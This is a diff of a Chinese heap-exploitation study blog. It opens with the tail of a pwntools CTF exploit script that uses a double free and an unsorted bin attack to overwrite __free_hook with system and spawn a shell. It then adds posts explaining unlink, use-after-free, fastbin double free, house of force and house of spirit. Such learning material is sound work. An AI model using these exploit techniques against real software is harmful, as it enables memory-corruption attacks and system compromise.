class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x71&#x27;</span>) <span class="comment">#这里申请一个跟unsorted bin chunk相邻的chunk，通过这个chunk来伪造unsorted bin chunk的size位</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;&#x27;</span>)	<span class="comment">#申请一个unsorted bin chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)	<span class="comment">#申请两个fast bin chunk实现double free</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f75f9240b78</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">sys = libc_base + (<span class="number">0x7f75f8ec13a0</span> - <span class="number">0x00007f75f8e7c000</span>)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7fd4270557a8</span> - <span class="number">0x7fd426c8f000</span>)</span><br><span class="line">arena = libc_base + (<span class="number">0x7f6553094b78</span> - <span class="number">0x7f6552cd0000</span>)	<span class="comment">#这里的arena是指unsorted bin的bin头位置</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x130</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0x60</span>,p64(heap_base+<span class="number">0x20</span>))	<span class="comment">#这里伪造fd指针</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(arena) + p64(free_hook-<span class="number">0x40</span>))	<span class="comment">#这里修改unsorted bin chunk的bk指针</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#unsorted bin attack</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook-<span class="number">0x30</span>-<span class="number">3</span>))	<span class="comment">#这里开始再进行一次堆块的伪造即可</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span> + p64(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/19/Unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/19/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-19 11:29:42" itemprop="dateCreated datePublished" datetime="2022-04-19T11:29:42+08:00">2022-04-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-20 13:15:48" itemprop="dateModified" datetime="2022-04-20T13:15:48+08:00">2022-04-20</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>Unlink对应解链的意思，其在libc里是一个宏定义，作用是将一个chunk从双向链表中取出，而且其还会检测与取出的这个chunk的物理相邻的位置是否还有free chunk，如果有则会触发向前合并（跟物理低地址的chunk合并）/向后合并（跟物理高地址的chunk合并）</p>
+<p>结合unlink源码的一部分来看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line">    FD = P-&gt;fd;                                                                      </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/17/how2heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/17/how2heap/" class="post-title-link" itemprop="url">how2heap</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-17 14:09:41 / 修改时间：14:25:15" itemprop="dateCreated datePublished" datetime="2022-04-17T14:09:41+08:00">2022-04-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="How2heap"><a href="#How2heap" class="headerlink" title="How2heap"></a>How2heap</h2><p>这里记一下从how2heap中学习所得</p>
+<h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h4><p>glibc使用第一契合算法来选择free chunk，就是如果程序在遍历bins链表的时候，如果找到一个free chunk足够大（也就是不小于用户需求），那么就会直接选择这个chunk来使用以此节省时间，而不是去遍历完所有的bin来寻找一个大小刚刚合适的chunk。</p>
+<p>如果遍历完bins链表都没有能满足用户需求大小的chunk，则在Top chunk中划分一块给用户。</p>
+<p>如果Top chunk的大小都不足以满足用户需求，则堆管理器再向系统申请内存，这里再分为：①申请的内存较小使用brk系统调用。②申请的内存较大使用mmap系统调用。</p>
+<p>综上：用户在申请内存时，先根据大小决定在哪个bins中寻找chunk，如果该申请的内存大小不满足fast bins的范围，则在unsorted bin中寻找，在unsorted bin中寻找不到就会触发其合并机制，合并完后进行归类，归类完后在对应大小的small bins或large bins中继续寻找。再找不到就top chunk…..</p>
+<p>只要在这个寻找的过程中找到了一个大于或等于用户申请需求的内存大小的chunk，则立刻停止寻找，这时这块chunk如果是大于申请需求的，则会进行划分，划分为刚好满足用户申请大小的chunk和剩余部分的chunk，这块剩余部分的chunk称为last remainder chunk，然后last remainder chunk会被填入相关控制字段，再重新进入unsorted bin中</p>
+<h4 id="use-after-free（释放重利用）"><a href="#use-after-free（释放重利用）" class="headerlink" title="use-after-free（释放重利用）"></a>use-after-free（释放重利用）</h4><p>（unsorted bin为双向链表，下图中省略了结构）（指针类型和malloc的大小为例子）</p>
+<p>① 依次执行 <code>char* a = malloc(0x512); char* b = malloc(0x256); free(a); </code></p>
+<p>由以上步骤得到如下图结构：</p>
+<img src="/2022/04/17/how2heap/use-after-free-1.jpg" class>
+
+<p>在这里要注意的是：一、<code>free(a);</code>之后a所指向的chunk中的数据不会被抹除，仅仅只是将这块chunk标记为free chunk。二、指针a（也就是malloc返回的指针）也不会消失，仍然指向原来的区域</p>
+<p>② <code>char* c = malloc(0x500);</code></p>
+<p>由于glibc的first fit算法，<code>malloc(0x500);</code>所得到的chunk会是刚释放掉的那块chunk，此时指针a跟指针c指向的是同一个位置</p>
+<img src="/2022/04/17/how2heap/use-after-free-2.png" class>
+
+<p>综上操作就得到了两个指向相同位置的指针，打印a和c，都会得到相同的内容，即原本chunk中的数据部分的内容</p>
+<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double-free"></a>Double-free</h4><p>fast bins会检查列入它的链表中的chunk的大小是否符合它此时fast bin所对应的大小，例如一个fast bin要存放的是0x20大小的chunk，则在一个free chunk在进入这个bin的链表之前会进行两个检查：(一) 要放进来的这个chunk是否与<strong>上一个</strong>放进来的chunk相同（也就是防止一个chunk被连续free两次）。(二) 要放进来的这个chunk的大小是否与这个bin的规定存放大小相等。程序正常运行时不会出现这种不相等的情况，但是设置这个检查就是为了防止恶意攻击。</p>
+<p>fast bins的double free检查存在的缺陷是它只检查准备放进来的这个chunk是否与上一个chunk相同，而不会检查整个链表中是否有跟这个chunk相同的chunk，这种简单的检查设计也是同时在兼顾着fast bins的速度问题，如果加入一些繁杂的检查机制会导致拖慢fast bins的速度。所以只要在第二次free掉一个已经free掉的chunk前free掉另一个chunk就可以绕过double free检查。</p>
+<p>① <code>int* a = malloc(8); int* b = malloc(8); int* c = malloc(8); </code></p>
+<p>首先malloc三块符合fast bins的chunk</p>
+<p>② <code>free(a); free(b); free(a);</code></p>
+<p>然后让a指针所对应的chunk释放两次，因为double free检查的存在，所以中间先把b指针所对应的chunk给free掉。到目前为止就得到了如下的fast bins结构：</p>
+<img src="/2022/04/17/how2heap/double-free-1.jpg" class>
+
+<p>③ <code>int* d = malloc(8); malloc(8);</code></p>
+<p>用指针d接收第二次被free掉的那块chunk，然后再malloc一次把中间的那块chunk去掉</p>
+<img src="/2022/04/17/how2heap/double-free-2.png" class>
+
+<p>到这里为止我们发现fast bins的指针跟指针d都指向了同一块chunk</p>
+<p>对于d的指针来说，a是一块malloced chunk，所以d的指针认为它所指的位置是数据体部分，可以往里任意写入数据，但在fast bin中的a是一块free chunk，a的数据体部分的第一个字长用作fd指针，所以d的指针可以通过写入数据来使fast bin中的a的fd指针指向任意位置。</p>
+<p>④ 通过d的指针将a的fd指针修改为栈上的一块内存</p>
+<p>因为在bin的链表中仅仅依靠指针来寻找和确定有无下一个chunk，所以修改fd指针后fast bin中就相当于多出了一个chunk，如下图：</p>
+<img src="/2022/04/17/how2heap/double-free-3.png" class>
+
+<img src="/2022/04/17/how2heap/double-free-4.png" class>
+
+<p>注意fd指针和堆返回的指针指向不同。应使要修改的栈上的值在fd指针下面两个字节处。</p>
+<h4 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted-bin-attack"></a>unsorted-bin-attack</h4><p>该攻击能达到的效果是向任意地址写入一个较大的数字，前提是能控制bk的值。</p>
+<p>该攻击虽然能向任意地址写，但不能控制写入的值，一般是作为其他攻击的铺垫。</p>
+<p>fast bins在32位平台中存放的chunk的大小在16-64之间，但这个限制实际上是由arena中的一个控制字段控制的，所以如果利用unsorted bin attack将这个控制字段修改，就能修改存放在fast bins中的chunk大小的限制，使得所有chunk被free掉之后都存入fast bins中，再结合fast bins的攻击达到控制程序执行流等目的。</p>
+<p>首先要了解从unsorted bin中取出一个chunk的流程</p>
+<p>下图是unsorted bin的结构</p>
+<img src="/2022/04/17/how2heap/unsorted-bin-attack-1.jpg" class>
+
+<p>当从unsorted bin从取出一个chunk（这里称为chunk1）时，为了保证unsorted bin的双向链表结构的完整，程序会修改unsorted bin表头的fd指针和被取出的chunk指向的下一块chunk（这里称为chunk2）的bk指针。</p>
+<p>那么如何将unsorted bin表头的fd指针和chunk2的bk指针修改为正确的值呢？显然这两个对应的值储存在chunk1的fd指针和bk指针中，所以此时unsorted bin表头的fd指针就会填上chunk1的fd指针的值，chunk2的bk指针就会填上chunk1的bk指针的值。</p>
+<p>最后形成如下结构</p>
+<img src="/2022/04/17/how2heap/unsorted-bin-attack-2.jpg" class>
+
+<p>由上过程我们可以发现，如果我们能够控制chunk1的fd指针的值，那么就相当于我们能够让任意地址作为chunk2，且在chunk1被取出的时候，程序就会自动向chunk2的对应位置中写入unsorted bin表头的所在地址，对于主进程来说，这个地址位于libc的数据段中，所以会是一个比较大的值。综上我们就完成了一个较大值的任意地址写。</p>
+<h4 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h4><p>需要：堆溢出</p>
+<p>通过堆溢出将top chunk的size控制字段修改成一个极大的数字，这是为了避免堆管理器在后面用mmap()系统调用来申请内存，以及让之后的内存申请都在top chunk中发生。</p>
+<img src="/2022/04/17/how2heap/house_of_force-1.jpg" class>
+
+<p>例如想修改栈上的一个值，我们第一次先malloc一个很大的空间，大到把栈的一部分也作为这块chunk的一部分，这块malloc的空间就会从top chunk当前的起始位置一直往内存的高地址划分，直到达到我们指定的大小，然后我们第二次再malloc一块chunk，那么这块chunk就会直接在栈上，此时我们就实现了往栈上写数据。</p>
+<p>而且如果我们malloc一个负数，那么就会在此时top chunk低地址处得到一块chunk（这是因为malloc的参数是无符号类型整数，所以我们传进一个负数的话会被解释成无符号类型整数，从而发生整数溢出，最后会得到从此时top chunk起始地址往低地址的一块对应大小的chunk），我们就可以用这种方式去修改程序段的某个地址的值。</p>
+<h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h4><p>该攻击实现的是任意地址分配chunk。</p>
+<p>主要有三个要求：① 伪造的假块需要一个字长对齐。② 目标地址-1字长处需要设置fast bin范围内的size。③ 需要设置目标地址chunk的下一个chunk的size，但是这个size只需要合理即可，不一定要是fast bin范围内的</p>
+<p>首先覆写一个指针指向一个我们伪造的fastbin假块，然后完成相应size的设置（该chunk的size，下一个chunk的size）之后直接free掉这个指针就完成了任意地址分配。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/16/%E5%A0%86%E5%88%A9%E7%94%A8-tcache/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -346,7 +689,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-15 22:33:42" itemprop="dateModified" datetime="2022-04-15T22:33:42+08:00">2022-04-15</time>
+                <time title="修改时间：2022-04-20 11:13:57" itemprop="dateModified" datetime="2022-04-20T11:13:57+08:00">2022-04-20</time>
               </span>
 
           
@@ -360,7 +703,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是存在于程序虚拟地址空间中的一块连续的线性区域，其提供动态分配内存，允许程序申请大小未知的内存。</p>
+          <h4 id="不错的文章"><a href="#不错的文章" class="headerlink" title="不错的文章"></a>不错的文章</h4><p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc – sploitF-U-N (wordpress.com)</a></p>
+<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是存在于程序虚拟地址空间中的一块连续的线性区域，其提供动态分配内存，允许程序申请大小未知的内存。</p>
 <p>堆的位置可以是紧贴数据段的上方，也可以是mmap中的某个位置</p>
 <h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><p>堆管理器在用户与操作系统之间作为动态内存管理的中间人，其响应用户申请内存的请求，并向操作系统申请内存，然后将其返回给用户程序。同时其管理用户所释放的内存，适时归还给操作系统。</p>
 <p>堆管理器并非由操作系统实现，而是<strong>由libc.so.6链接库</strong>实现，也就是说这段实现的代码存在于libc库中。其中封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效的管理由系统调用申请来的内存。</p>
@@ -390,18 +734,23 @@
 <li>chunk</li>
 <li>bin</li>
 </ul>
-<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena称为内存分配区，可以理解为堆管理器所持有的内存池。堆管理器与用户的内存交易发生在arena中。</p>
+<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><blockquote>
+<p>在 Linux 的早期，dlmalloc 被用作默认的内存分配器。但后来由于ptmalloc2的线程支持，它成为linux的默认内存分配器。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在dlmalloc中，当两个线程同时调用malloc时，只有一个线程可以进入关键部分，因为freelist数据结构在所有可用线程之间共享。因此，在多线程应用程序中，内存分配需要时间，从而导致性能下降。在 ptmalloc2 中，当两个线程同时调用 malloc 时，会立即分配内存，因为每个线程维护一个单独的堆段，因此维护这些堆的自由列表数据结构（也就是glibc中的bins）也是独立的。为每个线程维护单独的堆和 freelist 数据结构的这种行为称为 <strong>per thread arena</strong></p>
+</blockquote>
+<p>arena称为内存分配区，可以理解为堆管理器所持有的内存池。堆管理器与用户的内存交易发生在arena中。</p>
 <blockquote>
 <p>操作系统 –&gt; 堆管理器 –&gt; 用户</p>
 <p>物理内存 –&gt; arena –&gt; 可用内存</p>
 </blockquote>
 <p>例如主个线程在data段上方申请了堆这样一个段，那么在堆段中就会将申请得到的内存组合形成一个arena，这个arena分配区会有一个对应的控制结构来描述这个分配区的相关信息</p>
-<p>一个进程可以有多个arena，因为一个进程可以由多个线程构成，每个线程（包括主线程）都会有一个arena分配区，同时有各自对应的控制结构</p>
+<p>一个进程可以有多个arena，因为一个进程可以由多个线程构成，当线程较少的时候，arena与每个线程具有一对一映射，但是线程数量超过某个数量（与系统存在的内核数有关）时，glibc malloc在所有可用线程之间共享多个arena（这里涉及到arena上锁的知识，但是好像不重要）。</p>
 <p>arena里有一段控制结构，叫<code>malloc _state</code>，该结构的细节如下：</p>
 <p><strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong>libc.so</strong> <strong>的数据段</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>在<code>malloc_state</code>中有两个链表，分别为<code>fastbinY[]</code>和<code>bins[]</code>，<code>fastbinsY[]</code>属于<code>fast bins</code>，而在<code>bins[]</code>中被划分了三个区域，分别属于<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code></p>
+<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>一个线程的arena可以有多个堆（除了main_arena），每个堆都有属于自己的header。每个线程的arena在最开始的时候都只有一个堆，但当这个堆空间快用完的时候，新的堆空间（与原来堆空间不连续）就会被mmap()系统调用分配到这个arena中。</p>
+<p>main_arena没有多个堆，因此没有heap_info结构。当main_arena的空间不足的时候，其会使用sbrk()系统调用在原来的堆段上扩展空间，直到碰到mmap段。（这里不是很懂，主线程里申请的空间超过阈值时不也会使用mmap吗，那为什么说main_arena没有多个堆）</p>
 <h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。</p>
 <p>glibc中用一个结构体定义了chunk，其中包含6个控制信息，不同的chunk所用到的控制信息的数量不尽相同</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">	INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">	INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
@@ -558,63 +907,6 @@
 <p><strong>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些。</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>
 </blockquote>
-<h2 id="How2heap"><a href="#How2heap" class="headerlink" title="How2heap"></a>How2heap</h2><p>这里记一下从how2heap中学习所得</p>
-<h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h4><p>glibc使用第一契合算法来选择free chunk，就是如果程序在遍历bins链表的时候，如果找到一个free chunk足够大（也就是不小于用户需求），那么就会直接选择这个chunk来使用以此节省时间，而不是去遍历完所有的bin来寻找一个大小刚刚合适的chunk。</p>
-<p>如果遍历完bins链表都没有能满足用户需求大小的chunk，则在Top chunk中划分一块给用户。</p>
-<p>如果Top chunk的大小都不足以满足用户需求，则堆管理器再向系统申请内存，这里再分为：①申请的内存较小使用brk系统调用。②申请的内存较大使用mmap系统调用。</p>
-<p>综上：用户在申请内存时，先根据大小决定在哪个bins中寻找chunk，如果该申请的内存大小不满足fast bins的范围，则在unsorted bin中寻找，在unsorted bin中寻找不到就会触发其合并机制，合并完后进行归类，归类完后在对应大小的small bins或large bins中继续寻找。再找不到就top chunk…..</p>
-<p>只要在这个寻找的过程中找到了一个大于或等于用户申请需求的内存大小的chunk，则立刻停止寻找，这时这块chunk如果是大于申请需求的，则会进行划分，划分为刚好满足用户申请大小的chunk和剩余部分的chunk，这块剩余部分的chunk称为last remainder chunk，然后last remainder chunk会被填入相关控制字段，再重新进入unsorted bin中</p>
-<h4 id="use-after-free（释放重利用）"><a href="#use-after-free（释放重利用）" class="headerlink" title="use-after-free（释放重利用）"></a>use-after-free（释放重利用）</h4><p>（unsorted bin为双向链表，下图中省略了结构）（指针类型和malloc的大小为例子）</p>
-<p>① 依次执行 <code>char* a = malloc(0x512); char* b = malloc(0x256); free(a); </code></p>
-<p>由以上步骤得到如下图结构：</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/use-after-free-1.jpg" class>
-
-<p>在这里要注意的是：一、<code>free(a);</code>之后a所指向的chunk中的数据不会被抹除，仅仅只是将这块chunk标记为free chunk。二、指针a（也就是malloc返回的指针）也不会消失，仍然指向原来的区域</p>
-<p>② <code>char* c = malloc(0x500);</code></p>
-<p>由于glibc的first fit算法，<code>malloc(0x500);</code>所得到的chunk会是刚释放掉的那块chunk，此时指针a跟指针c指向的是同一个位置</p>
-<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/use-after-free-2.png" class>
-
-<p>综上操作就得到了两个指向相同位置的指针，打印a和c，都会得到相同的内容，即原本chunk中的数据部分的内容</p>
-<h4 id="Double-free"><a href="#Double-free" class="headerlink" title="Double-free"></a>Double-free</h4><p>fast bins会检查列入它的链表中的chunk的大小是否符合它此时fast bin所对应的大小，例如一个fast bin要存放的是0x20大小的chunk，则在一个free chunk在进入这个bin的链表之前会进行两个检查：(一) 要放进来的这个chunk是否与<strong>上一个</strong>放进来的chunk相同（也就是防止一个chunk被连续free两次）。(二) 要放进来的这个chunk的大小是否与这个bin的规定存放大小相等。程序正常运行时不会出现这种不相等的情况，但是设置这个检查就是为了防止恶意攻击。</p>
